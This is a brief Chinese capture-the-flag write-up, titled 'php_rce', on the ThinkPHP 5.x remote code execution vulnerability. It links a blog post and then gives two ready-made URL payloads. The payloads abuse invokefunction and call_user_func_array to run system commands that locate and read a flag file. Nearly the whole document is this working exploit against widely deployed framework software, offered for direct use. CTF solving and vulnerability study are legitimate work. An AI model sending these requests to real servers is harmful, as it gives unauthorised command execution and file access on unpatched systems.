
# php_rce

* 知识点
``` 
ThinkPHP5.x rec 漏洞
https://blog.csdn.net/qq_40884727/article/details/101452478
```

* 编写payload
``` 
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22

/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
```